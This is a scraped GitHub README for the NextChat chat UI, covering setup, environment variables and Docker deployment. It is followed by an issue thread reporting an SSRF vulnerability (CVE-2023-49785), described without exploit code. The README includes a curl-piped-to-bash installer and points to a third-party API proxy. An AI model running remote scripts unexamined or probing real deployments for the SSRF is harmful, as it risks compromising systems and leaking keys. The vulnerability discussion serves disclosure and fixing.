* Artifacts: 通过独立窗口，轻松预览、复制和分享生成的内容/可交互网页 [#5092](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/pull/5092)
* 插件机制，支持`联网搜索`、`计算器`、调用其他平台 api [#165](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/165) [#5353](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5353)
  + 支持联网搜索、计算器、调用其他平台 api [#165](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/165) [#5353](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5353)
* 支持 Realtime Chat [#5672](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5672)
* 本地知识库

## 最新动态

* 🚀 v2.15.8 现在支持Realtime Chat [#5672](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5672)
* 🚀 v2.15.4 客户端支持Tauri本地直接调用大模型API，更安全！[#5379](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5379)
* 🚀 v2.15.0 现在支持插件功能了！了解更多：[NextChat-Awesome-Plugins](https://github.com/ChatGPTNextWeb/NextChat-Awesome-Plugins)
* 🚀 v2.14.0 现在支持 Artifacts & SD 了。
* 🚀 v2.10.1 现在支持 Gemini Pro 模型。
* 🚀 v2.9.11 现在可以使用自定义 Azure 服务了。
* 🚀 v2.8 发布了横跨 Linux/Windows/MacOS 的体积极小的客户端。
* 🚀 v2.7 现在可以将会话分享为图片了，也可以分享到 ShareGPT 的在线链接。
* 🚀 v2.0 已经发布，现在你可以使用面具功能快速创建预制对话了！ 了解更多： [ChatGPT 提示词高阶技能：零次、一次和少样本提示](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/138)。
* 💡 想要更方便地随时随地使用本项目？可以试下这款桌面插件：<https://github.com/mushan0x0/AI0x0.com>

## Get Started

> [简体中文 > 如何开始使用](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_CN.md#%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8)

1. Get [OpenAI API Key](https://platform.openai.com/account/api-keys);
2. Click
   [![Deploy with Vercel](https://camo.githubusercontent.com/20bea215d35a4e28f2c92ea5b657d006b087687486858a40de2922a4636301ab/68747470733a2f2f76657263656c2e636f6d2f627574746f6e)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FYidadaa%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=chatgpt-next-web&repository-name=ChatGPT-Next-Web), remember that `CODE` is your page password;
3. Enjoy :)

## FAQ

[简体中文 > 常见问题](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/faq-cn.md)

[English > FAQ](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/faq-en.md)

## Keep Updated

> [简体中文 > 如何保持代码更新](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_CN.md#%E4%BF%9D%E6%8C%81%E6%9B%B4%E6%96%B0)

If you have deployed your own project with just one click following the steps above, you may encounter the issue of "Updates Available" constantly showing up. This is because Vercel will create a new project for you by default instead of forking this project, resulting in the inability to detect updates correctly.

We recommend that you follow the steps below to re-deploy:

* Delete the original repository;
* Use the fork button in the upper right corner of the page to fork this project;
* Choose and deploy in Vercel again, [please see the detailed tutorial](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/vercel-cn.md).

### Enable Automatic Updates

> If you encounter a failure of Upstream Sync execution, please [manually update code](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README.md#manually-updating-code).

After forking the project, due to the limitations imposed by GitHub, you need to manually enable Workflows and Upstream Sync Action on the Actions page of the forked project. Once enabled, automatic updates will be scheduled every hour:

[![Automatic Updates](/ChatGPTNextWeb/ChatGPT-Next-Web/raw/main/docs/images/enable-actions.jpg)](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/images/enable-actions.jpg)

[![Enable Automatic Updates](/ChatGPTNextWeb/ChatGPT-Next-Web/raw/main/docs/images/enable-actions-sync.jpg)](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/images/enable-actions-sync.jpg)

### Manually Updating Code

If you want to update instantly, you can check out the [GitHub documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/syncing-a-fork) to learn how to synchronize a forked project with upstream code.

You can star or watch this project or follow author to get release notifications in time.

## Access Password

> [简体中文 > 如何增加访问密码](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_CN.md#%E9%85%8D%E7%BD%AE%E9%A1%B5%E9%9D%A2%E8%AE%BF%E9%97%AE%E5%AF%86%E7%A0%81)

This project provides limited access control. Please add an environment variable named `CODE` on the vercel environment variables page. The value should be passwords separated by comma like this:

```
code1,code2,code3

```

After adding or modifying this environment variable, please redeploy the project for the changes to take effect.

## Environment Variables

> [简体中文 > 如何配置 api key、访问密码、接口代理](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_CN.md#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F)

### `CODE` (optional)

Access password, separated by comma.

### `OPENAI_API_KEY` (required)

Your openai api key, join multiple api keys with comma.

### `BASE_URL` (optional)

> Default: `https://api.openai.com`

> Examples: `http://your-openai-proxy.com`

Override openai api request base url.

### `OPENAI_ORG_ID` (optional)

Specify OpenAI organization ID.

### `AZURE_URL` (optional)

> Example: https://{azure-resource-url}/openai

Azure deploy url.

### `AZURE_API_KEY` (optional)

Azure Api Key.

### `AZURE_API_VERSION` (optional)

Azure Api Version, find it at [Azure Documentation](https://learn.microsoft.com/en-us/azure/ai-services/openai/reference#chat-completions).

### `GOOGLE_API_KEY` (optional)

Google Gemini Pro Api Key.

### `GOOGLE_URL` (optional)

Google Gemini Pro Api Url.

### `ANTHROPIC_API_KEY` (optional)

anthropic claude Api Key.

### `ANTHROPIC_API_VERSION` (optional)

anthropic claude Api version.

### `ANTHROPIC_URL` (optional)

anthropic claude Api Url.

### `BAIDU_API_KEY` (optional)

Baidu Api Key.

### `BAIDU_SECRET_KEY` (optional)

Baidu Secret Key.

### `BAIDU_URL` (optional)

Baidu Api Url.

### `BYTEDANCE_API_KEY` (optional)

ByteDance Api Key.

### `BYTEDANCE_URL` (optional)

ByteDance Api Url.

### `ALIBABA_API_KEY` (optional)

Alibaba Cloud Api Key.

### `ALIBABA_URL` (optional)

Alibaba Cloud Api Url.

### `IFLYTEK_URL` (Optional)

iflytek Api Url.

### `IFLYTEK_API_KEY` (Optional)

iflytek Api Key.

### `IFLYTEK_API_SECRET` (Optional)

iflytek Api Secret.

### `CHATGLM_API_KEY` (optional)

ChatGLM Api Key.

### `CHATGLM_URL` (optional)

ChatGLM Api Url.

### `DEEPSEEK_API_KEY` (optional)

DeepSeek Api Key.

### `DEEPSEEK_URL` (optional)

DeepSeek Api Url.

### `HIDE_USER_API_KEY` (optional)

> Default: Empty

If you do not want users to input their own API key, set this value to 1.

### `DISABLE_GPT4` (optional)

> Default: Empty

If you do not want users to use GPT-4, set this value to 1.

### `ENABLE_BALANCE_QUERY` (optional)

> Default: Empty

If you do want users to query balance, set this value to 1.

### `DISABLE_FAST_LINK` (optional)

> Default: Empty

If you want to disable parse settings from url, set this to 1.

### `CUSTOM_MODELS` (optional)

> Default: Empty
> Example: `+llama,+claude-2,-gpt-3.5-turbo,gpt-4-1106-preview=gpt-4-turbo` means add `llama, claude-2` to model list, and remove `gpt-3.5-turbo` from list, and display `gpt-4-1106-preview` as `gpt-4-turbo`.

To control custom models, use `+` to add a custom model, use `-` to hide a model, use `name=displayName` to customize model name, separated by comma.

User `-all` to disable all default models, `+all` to enable all default models.

For Azure: use `modelName@Azure=deploymentName` to customize model name and deployment name.

> Example: `+gpt-3.5-turbo@Azure=gpt35` will show option `gpt35(Azure)` in model list.
> If you only can use Azure model, `-all,+gpt-3.5-turbo@Azure=gpt35` will `gpt35(Azure)` the only option in model list.

For ByteDance: use `modelName@bytedance=deploymentName` to customize model name and deployment name.

> Example: `+Doubao-lite-4k@bytedance=ep-xxxxx-xxx` will show option `Doubao-lite-4k(ByteDance)` in model list.

### `DEFAULT_MODEL` （optional）

Change default model

### `VISION_MODELS` (optional)

> Default: Empty
> Example: `gpt-4-vision,claude-3-opus,my-custom-model` means add vision capabilities to these models in addition to the default pattern matches (which detect models containing keywords like "vision", "claude-3", "gemini-1.5", etc).

Add additional models to have vision capabilities, beyond the default pattern matching. Multiple models should be separated by commas.

### `WHITE_WEBDAV_ENDPOINTS` (optional)

You can use this option if you want to increase the number of webdav service addresses you are allowed to access, as required by the format：

* Each address must be a complete endpoint

> `https://xxxx/yyy`

* Multiple addresses are connected by ', '

### `DEFAULT_INPUT_TEMPLATE` (optional)

Customize the default template used to initialize the User Input Preprocessing configuration item in Settings.

### `STABILITY_API_KEY` (optional)

Stability API key.

### `STABILITY_URL` (optional)

Customize Stability API url.

## Requirements

NodeJS >= 18, Docker >= 20

## Development

> [简体中文 > 如何进行二次开发](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_CN.md#%E5%BC%80%E5%8F%91)

[![Open in Gitpod](https://camo.githubusercontent.com/b04f5659467d23b5109ba935a40c00decd264eea25c22d50a118021349eea94f/68747470733a2f2f676974706f642e696f2f627574746f6e2f6f70656e2d696e2d676974706f642e737667)](https://gitpod.io/#https://github.com/Yidadaa/ChatGPT-Next-Web)

Before starting development, you must create a new `.env.local` file at project root, and place your api key into it:

```
OPENAI_API_KEY=<your api key here>

# if you are not able to access openai service, use this BASE_URL
BASE_URL=https://chatgpt1.nextweb.fun/api/proxy

```

### Local Development

```
# 1. install nodejs and yarn first
# 2. config local env vars in `.env.local`
# 3. run
yarn install
yarn dev
```

## Deployment

> [简体中文 > 如何部署到私人服务器](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_CN.md#%E9%83%A8%E7%BD%B2)

### BT Install

> [简体中文 > 如何通过宝塔一键部署](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/bt-cn.md)

### Docker (Recommended)

```
docker pull yidadaa/chatgpt-next-web

docker run -d -p 3000:3000 \
   -e OPENAI_API_KEY=sk-xxxx \
   -e CODE=your-password \
   yidadaa/chatgpt-next-web
```

You can start service behind a proxy:

```
docker run -d -p 3000:3000 \
   -e OPENAI_API_KEY=sk-xxxx \
   -e CODE=your-password \
   -e PROXY_URL=http://localhost:7890 \
   yidadaa/chatgpt-next-web
```

If your proxy needs password, use:

```
-e PROXY_URL="http://127.0.0.1:7890 user pass"
```

### Shell

```
bash <(curl -s https://raw.githubusercontent.com/Yidadaa/ChatGPT-Next-Web/main/scripts/setup.sh)
```

## Synchronizing Chat Records (UpStash)

| [简体中文](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/synchronise-chat-logs-cn.md) | [English](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/synchronise-chat-logs-en.md) | [Italiano](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/synchronise-chat-logs-es.md) | [日本語](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/synchronise-chat-logs-ja.md) | [한국어](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/synchronise-chat-logs-ko.md)

## Documentation

> Please go to the [docs][./docs] directory for more documentation instructions.

* [Deploy with cloudflare (Deprecated)](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/cloudflare-pages-en.md)
* [Frequent Ask Questions](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/faq-en.md)
* [How to add a new translation](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/translation.md)
* [How to use Vercel (No English)](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/vercel-cn.md)
* [User Manual (Only Chinese, WIP)](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/user-manual-cn.md)

## Screenshots

[![Settings](/ChatGPTNextWeb/ChatGPT-Next-Web/raw/main/docs/images/settings.png)](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/images/settings.png)

[![More](/ChatGPTNextWeb/ChatGPT-Next-Web/raw/main/docs/images/more.png)](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/images/more.png)

## Translation

If you want to add a new translation, read this [document](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/translation.md).

## Donation

[Buy Me a Coffee](https://www.buymeacoffee.com/yidadaa)

## Special Thanks

### Sponsor

> 仅列出捐赠金额 >= 100RMB 的用户。

[@mushan0x0](https://github.com/mushan0x0)
[@ClarenceDan](https://github.com/ClarenceDan)
[@zhangjia](https://github.com/zhangjia)
[@hoochanlon](https://github.com/hoochanlon)
[@relativequantum](https://github.com/relativequantum)
[@desenmeng](https://github.com/desenmeng)
[@webees](https://github.com/webees)
[@chazzhou](https://github.com/chazzhou)
[@hauy](https://github.com/hauy)
[@Corwin006](https://github.com/Corwin006)
[@yankunsong](https://github.com/yankunsong)
[@ypwhs](https://github.com/ypwhs)
[@fxxxchao](https://github.com/fxxxchao)
[@hotic](https://github.com/hotic)
[@WingCH](https://github.com/WingCH)
[@jtung4](https://github.com/jtung4)
[@micozhu](https://github.com/micozhu)
[@jhansion](https://github.com/jhansion)
[@Sha1rholder](https://github.com/Sha1rholder)
[@AnsonHyq](https://github.com/AnsonHyq)
[@synwith](https://github.com/synwith)
[@piksonGit](https://github.com/piksonGit)
[@ouyangzhiping](https://github.com/ouyangzhiping)
[@wenjiavv](https://github.com/wenjiavv)
[@LeXwDeX](https://github.com/LeXwDeX)
[@Licoy](https://github.com/Licoy)
[@shangmin2009](https://github.com/shangmin2009)

### Contributors

[![](https://camo.githubusercontent.com/09e01537cbf989406957e0ef7f23194dc47a25782977925f8d5769a91c8d669e/68747470733a2f2f636f6e747269622e726f636b732f696d6167653f7265706f3d436861744750544e6578745765622f436861744750542d4e6578742d576562)](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/graphs/contributors)
## LICENSE

[MIT](https://opensource.org/license/mit/)

## About

A cross-platform ChatGPT/Gemini UI (Web / PWA / Linux / Win / MacOS). 一键拥有你自己的跨平台 ChatGPT/Gemini/Claude LLM 应用。

[nextchat.dev/chat](https://nextchat.dev/chat "https://nextchat.dev/chat")

### Topics

[react](/topics/react "Topic: react")
[cross-platform](/topics/cross-platform "Topic: cross-platform")
[nextjs](/topics/nextjs "Topic: nextjs")
[desktop](/topics/desktop "Topic: desktop")
[gemini](/topics/gemini "Topic: gemini")
[webui](/topics/webui "Topic: webui")
[fe](/topics/fe "Topic: fe")
[claude](/topics/claude "Topic: claude")
[tauri](/topics/tauri "Topic: tauri")
[groq](/topics/groq "Topic: groq")
[vercel](/topics/vercel "Topic: vercel")
[tauri-app](/topics/tauri-app "Topic: tauri-app")
[gemini-server](/topics/gemini-server "Topic: gemini-server")
[chatgpt](/topics/chatgpt "Topic: chatgpt")
[ollama](/topics/ollama "Topic: ollama")
[gemini-pro](/topics/gemini-pro "Topic: gemini-pro")
[gemini-ultra](/topics/gemini-ultra "Topic: gemini-ultra")
[calclaude](/topics/calclaude "Topic: calclaude")
[gpt-4o](/topics/gpt-4o "Topic: gpt-4o")

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)
### Code of conduct

[Code of conduct](#coc-ov-file)

[Activity](/ChatGPTNextWeb/ChatGPT-Next-Web/activity)
[Custom properties](/ChatGPTNextWeb/ChatGPT-Next-Web/custom-properties)
### Stars

[**78.5k**
stars](/ChatGPTNextWeb/ChatGPT-Next-Web/stargazers)
### Watchers

[**420**
watching](/ChatGPTNextWeb/ChatGPT-Next-Web/watchers)
### Forks

[**60k**
forks](/ChatGPTNextWeb/ChatGPT-Next-Web/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web&report=ChatGPTNextWeb+%28user%29)

## [Releases 75](/ChatGPTNextWeb/ChatGPT-Next-Web/releases)

[v2.15.8 Support OpenAI Realtime API
Latest

Nov 11, 2024](/ChatGPTNextWeb/ChatGPT-Next-Web/releases/tag/v2.15.8)
[+ 74 releases](/ChatGPTNextWeb/ChatGPT-Next-Web/releases)

## [Contributors 240](/ChatGPTNextWeb/ChatGPT-Next-Web/graphs/contributors)

* [![@Yidadaa](https://avatars.githubusercontent.com/u/16968934?s=64&v=4)](https://github.com/Yidadaa)
* [![@lloydzhou](https://avatars.githubusercontent.com/u/1826685?s=64&v=4)](https://github.com/lloydzhou)
* [![@Dogtiti](https://avatars.githubusercontent.com/u/38354472?s=64&v=4)](https://github.com/Dogtiti)
* [![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=64&v=4)](https://github.com/fred-bf)
* [![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=64&v=4)](https://github.com/H0llyW00dzZ)
* [![@DDMeaqua](https://avatars.githubusercontent.com/u/110169811?s=64&v=4)](https://github.com/DDMeaqua)
* [![@Dean-YZG](https://avatars.githubusercontent.com/u/138353356?s=64&v=4)](https://github.com/Dean-YZG)
* [![@dependabot[bot]](https://avatars.githubusercontent.com/in/29110?s=64&v=4)](https://github.com/apps/dependabot)
* [![@fredliang44](https://avatars.githubusercontent.com/u/22412638?s=64&v=4)](https://github.com/fredliang44)
* [![@actions-user](https://avatars.githubusercontent.com/u/65916846?s=64&v=4)](https://github.com/actions-user)
* [![@mayfwl](https://avatars.githubusercontent.com/u/123177290?s=64&v=4)](https://github.com/mayfwl)
* [![@leedom92](https://avatars.githubusercontent.com/u/30711792?s=64&v=4)](https://github.com/leedom92)
* [![@yanCode](https://avatars.githubusercontent.com/u/2328124?s=64&v=4)](https://github.com/yanCode)
* [![@Leizhenpeng](https://avatars.githubusercontent.com/u/50035229?s=64&v=4)](https://github.com/Leizhenpeng)

[+ 226 contributors](/ChatGPTNextWeb/ChatGPT-Next-Web/graphs/contributors)

## Languages

* [TypeScript
  91.8%](/ChatGPTNextWeb/ChatGPT-Next-Web/search?l=typescript)
* [SCSS
  6.6%](/ChatGPTNextWeb/ChatGPT-Next-Web/search?l=scss)
* Other
  1.6%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_bcc09b29_20250110_115323.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web%2Fissues%2F4283)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web%2Fissues%2F4283)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=ChatGPTNextWeb%2FChatGPT-Next-Web)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ChatGPTNextWeb](/ChatGPTNextWeb)
/
**[ChatGPT-Next-Web](/ChatGPTNextWeb/ChatGPT-Next-Web)**
Public

* [Notifications](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web) You must be signed in to change notification settings
* [Fork
  60k](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web)
* [Star
   78.5k](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web)

* [Code](/ChatGPTNextWeb/ChatGPT-Next-Web)
* [Issues
  484](/ChatGPTNextWeb/ChatGPT-Next-Web/issues)
* [Pull requests
  75](/ChatGPTNextWeb/ChatGPT-Next-Web/pulls)
* [Discussions](/ChatGPTNextWeb/ChatGPT-Next-Web/discussions)
* [Actions](/ChatGPTNextWeb/ChatGPT-Next-Web/actions)
* [Projects
  1](/ChatGPTNextWeb/ChatGPT-Next-Web/projects)
* [Security](/ChatGPTNextWeb/ChatGPT-Next-Web/security)
* [Insights](/ChatGPTNextWeb/ChatGPT-Next-Web/pulse)

Additional navigation options

* [Code](/ChatGPTNextWeb/ChatGPT-Next-Web)
* [Issues](/ChatGPTNextWeb/ChatGPT-Next-Web/issues)
* [Pull requests](/ChatGPTNextWeb/ChatGPT-Next-Web/pulls)
* [Discussions](/ChatGPTNextWeb/ChatGPT-Next-Web/discussions)
* [Actions](/ChatGPTNextWeb/ChatGPT-Next-Web/actions)
* [Projects](/ChatGPTNextWeb/ChatGPT-Next-Web/projects)
* [Security](/ChatGPTNextWeb/ChatGPT-Next-Web/security)
* [Insights](/ChatGPTNextWeb/ChatGPT-Next-Web/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [Bug] NextChat cors SSRF 漏洞（CVE-2023-49785） #4283

Closed

[006lp](/006lp) opened this issue
Mar 13, 2024
· 13 comments
 · Fixed by [#4285](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285)

Closed

# [[Bug] NextChat cors SSRF 漏洞（CVE-2023-49785）](#top) #4283

[006lp](/006lp) opened this issue
Mar 13, 2024
· 13 comments
 · Fixed by [#4285](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285)

Labels
[bug](/ChatGPTNextWeb/ChatGPT-Next-Web/labels/bug)
Something isn't working

## Comments

[![@006lp](https://avatars.githubusercontent.com/u/144674902?s=80&u=4b37ea2f48578e0cbd76aca34589872255317160&v=4)](/006lp)

Copy link

### **[006lp](/006lp)** commented [Mar 13, 2024](#issue-2184134061)

| 原文来自<https://avd.aliyun.com/detail?id=AVD-2023-49785> 漏洞描述 NextChat 是一个面向用户的GPT类应用程序，用户可以通过这个程序与GPT进行交互。2024年3月，互联网上披露[CVE-2023-49785](https://github.com/advisories/GHSA-qf3q-9f3h-cjp9 "CVE-2023-49785") NextChat cors SSRF 漏洞，攻击者可在无需登陆的情况下构造恶意请求造成SSRF，造成敏感信息泄漏等。 |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
2
 jokester and xhd193694 reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

[![@nextchat-manager](https://avatars.githubusercontent.com/u/153288546?s=80&v=4)](/apps/nextchat-manager)

Copy link

### **[nextchat-manager](/apps/nextchat-manager) bot** commented [Mar 13, 2024](#issuecomment-1994513241)

| Please follow the [issue template](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.github/ISSUE_TEMPLATE/bug_report.md) to update title and description of your issue. |
| --- |

All reactions

Sorry, something went wrong.

[![@Issues-translate-bot](https://avatars.githubusercontent.com/u/74373520?s=80&u=81312179bcc1c4f805974c2a1cd79a6180efe735&v=4)](/Issues-translate-bot)

Copy link

### **[Issues-translate-bot](/Issues-translate-bot)** commented [Mar 13, 2024](#issuecomment-1994513525)

| Bot detected the issue body's language is not English, translate it automatically.   ---   **Title:** NextChat cors SSRF vulnerability ([CVE-2023-49785](https://github.com/advisories/GHSA-qf3q-9f3h-cjp9 "CVE-2023-49785"))  Original text from <https://avd.aliyun.com/detail?id=AVD-2023-49785> Vulnerability description NextChat is a user-oriented GPT application through which users can interact with GPT. In March 2024, the [CVE-2023-49785](https://github.com/advisories/GHSA-qf3q-9f3h-cjp9 "CVE-2023-49785") NextChat cors SSRF vulnerability was disclosed on the Internet. Attackers can construct malicious requests to cause SSRF without logging in, causing sensitive information to leak. |
| --- |

All reactions

Sorry, something went wrong.

[![@006lp](https://avatars.githubusercontent.com/u/144674902?s=40&u=4b37ea2f48578e0cbd76aca34589872255317160&v=4)](/006lp)
[006lp](/006lp)
changed the title
~~NextChat cors SSRF 漏洞（CVE-2023-49785）~~
[Bug]NextChat cors SSRF 漏洞（CVE-2023-49785）
[Mar 13, 2024](#event-12104309763)

[![@006lp](https://avatars.githubusercontent.com/u/144674902?s=40&u=4b37ea2f48578e0cbd76aca34589872255317160&v=4)](/006lp)
[006lp](/006lp)
changed the title
~~[Bug]NextChat cors SSRF 漏洞（CVE-2023-49785）~~
[Bug] NextChat cors SSRF 漏洞（CVE-2023-49785）
[Mar 13, 2024](#event-12104314673)

[![@Yidadaa](https://avatars.githubusercontent.com/u/16968934?s=80&u=c98e4b11a628e0d18b7774d62dd5c5da9b9dedd3&v=4)](/Yidadaa)

Copy link

Collaborator

### **[Yidadaa](/Yidadaa)** commented [Mar 13, 2024](#issuecomment-1994518255)

| [@fred-bf](https://github.com/fred-bf) [@fredliang44](https://github.com/fredliang44)  This bug is pretty serious. If it's a private deployment, attackers could exploit it to access server resources without permission, causing security issues. |
| --- |

All reactions

Sorry, something went wrong.

[![@Yidadaa](https://avatars.githubusercontent.com/u/16968934?s=40&u=c98e4b11a628e0d18b7774d62dd5c5da9b9dedd3&v=4)](/Yidadaa)
[Yidadaa](/Yidadaa)
added
the
[bug](/ChatGPTNextWeb/ChatGPT-Next-Web/labels/bug)
Something isn't working
label
[Mar 13, 2024](#event-12104410698)

[![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=80&u=104ae2435dc71b28482382b4ebae817e56bfc5c3&v=4)](/H0llyW00dzZ)

Copy link

Contributor

### **[H0llyW00dzZ](/H0llyW00dzZ)** commented [Mar 13, 2024](#issuecomment-1994545598)

| [@fred-bf](https://github.com/fred-bf) [@fredliang44](https://github.com/fredliang44)  This bug is pretty serious. If it's a private deployment, attackers could exploit it to access server resources without permission, causing security issues.  it easy to patch by adding validation url |
| --- |

All reactions

Sorry, something went wrong.

[![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=80&u=104ae2435dc71b28482382b4ebae817e56bfc5c3&v=4)](/H0llyW00dzZ)

Copy link

Contributor

### **[H0llyW00dzZ](/H0llyW00dzZ)** commented [Mar 13, 2024](#issuecomment-1994550018)

